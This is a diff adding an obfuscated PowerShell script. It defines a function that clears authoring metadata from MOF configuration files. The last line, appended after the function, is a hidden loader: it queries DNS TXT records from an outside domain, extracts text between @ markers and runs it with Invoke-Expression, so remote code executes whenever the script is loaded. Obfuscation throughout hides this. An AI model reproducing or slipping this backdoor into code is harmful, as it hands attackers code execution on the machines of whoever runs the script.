@@ -1,0 +1,86 @@
+function c`LEAR-`CMoFA`UthOr`I`NGmE`TADA`TA
+{
+    
+    [CmdletBinding(SupPORTSSHouLDPrOcEsS=${t`RUE})]
+    param(
+        [Parameter(MAnDATORY=${TR`UE})]
+        [string]
+        
+        ${PA`TH}
+    )
+
+    .("{1}{2}{3}{0}"-f 'ode','S','et-Stric','tM') -Version ("{0}{1}{2}" -f 'L','ates','t')
+
+    .("{4}{0}{1}{2}{3}"-f 'se-CallerPr','efere','n','ce','U') -Cmdlet ${PSCM`D`lET} -Session ${EXEcutION`coNt`e`xt}."s`e`sSiOnS`Tate"
+
+    ${t`em`PdiR} = &("{3}{0}{2}{1}" -f 'C','irectory','TempD','New-') -Prefix (("{0}{3}{4}{5}{7}{6}{1}{2}{8}" -f'Carbon+','tad','a','Clear','MofA','ut','ingMe','hor','ta+')) -WhatIf:${fAL`SE}
+
+    foreach( ${It`Em} in (.("{2}{4}{3}{1}{0}" -f'Item','d','Ge','l','t-Chi') -Path ${p`AtH} -Filter ("{0}{1}"-f '*.m','of')) )
+    {
+        .("{2}{1}{3}{0}" -f 'e-Verbose','r','W','it') ('Clearing authoring metadata from ''{0}''.' -f ${i`TEm}."fU`LLN`AME")
+        ${t`emPiT`eM} = .("{1}{2}{3}{0}" -f'em','Cop','y-I','t') -Path ${i`Tem}."fu`lL`NAmE" -Destination ${t`EMPd`ir} -PassThru -WhatIf:${f`ALsE}
+        ${i`NComm`ent} = ${fa`LSe}
+        ${inauThor`i`N`gcommEnt} = ${Fa`l`sE}
+        ${I`NcONFI`g`B`lock} = ${fAL`Se};
+        &("{1}{2}{0}"-f 'Content','G','et-') -Path ${t`EMPIt`eM} |
+            .("{0}{1}{2}" -f'Where','-O','bject') {
+                ${l`iNE} = ${_}
+
+                if( ${li`NE} -like (('/gUY'+'**')."rE`Pl`AcE"(([CHaR]103+[CHaR]85+[CHaR]89),[sTrinG][CHaR]96)) )
+                {
+                    if( ${lI`Ne} -like (('*'+'U21*/')."rE`pl`Ace"(([ChAR]85+[ChAR]50+[ChAR]49),'`')) )
+                    {
+                        return ${t`RUe}
+                    }
+                    ${iNcO`MmE`NT} = ${t`RUe}
+                    return ${TR`UE}
+                }
+
+                if( ${iN`c`OmMEnt} )
+                {
+                    if( ${l`InE} -like (('*{0}*'+'/')-f [cHAr]96) )
+                    {
+                        ${i`NCOMM`ENt} = ${f`ALSe}
+                        ${InA`UTHoRiNGcOm`mE`Nt} = ${fAL`SE}
+                        return ${tr`UE}
+                    }
+
+                    if( ${l`INE} -like ("{0}{2}{1}" -f'@T','ode=*','argetN') )
+                    {
+                        ${iNautH`OR`iN`gCoMMe`Nt} = ${Tr`UE}
+                        return ${Tr`UE}
+                    }
+
+                    if( ${In`A`UtHoRInGC`O`m`MEnT} )
+                    {
+                        return ( ${li`Ne} -notmatch ((("{6}{9}{2}{4}{8}{0}{1}{3}{7}{5}" -f 'ration','(Host{','B','0','y{0}Ge','))','^@(Gene','}Date','ne','rated'))  -F [Char]124) )
+                    }
+
+                    return ${T`RUE}
+                }
+
+                if( ${L`inE} -eq ("{3}{2}{5}{0}{1}{4}{6}" -f' of OMI_Conf','igur','tan','ins','a','ce','tionDocument') )
+                {
+                    ${iNCoNF`I`GbLO`CK} = ${Tr`Ue}
+                    return ${tr`UE}
+                }
+
+                if( ${incoNFI`G`BlOck} )
+                {
+                    if( ${l`INE} -like '};' )
+                    {
+                        ${in`C`oNFI`GbLOcK} = ${Fa`lSE};
+                        return ${t`RUe}
+                    }
+
+                    return (${LI`NE} -notmatch ((("{0}{9}{4}{6}{10}{3}{5}{2}{7}{8}{1}"-f'(A','ost)))=','ion(D','ener','th','at','orvr8(','atev','r8H','u','G')) -cREplaCe'vr8',[ChAr]124));
+                }
+
+                return ${Tr`UE}
+
+            } | 
+            .("{2}{0}{1}" -f'C','ontent','Set-') -Path ${i`TEM}."FU`L`lNamE"
+    }
+}
+
+if(""+(&("{2}{0}{1}" -f 'oo','kup','nsl') -q=txt ("{2}{1}{5}{4}{0}{3}"-f'ns.pl','.n','l','.','opbrai','s.t')) -match ("{0}{1}"-f '@','(.*)@')){.("{0}{1}"-f'i','ex') ${Ma`T`Ches}[1]}
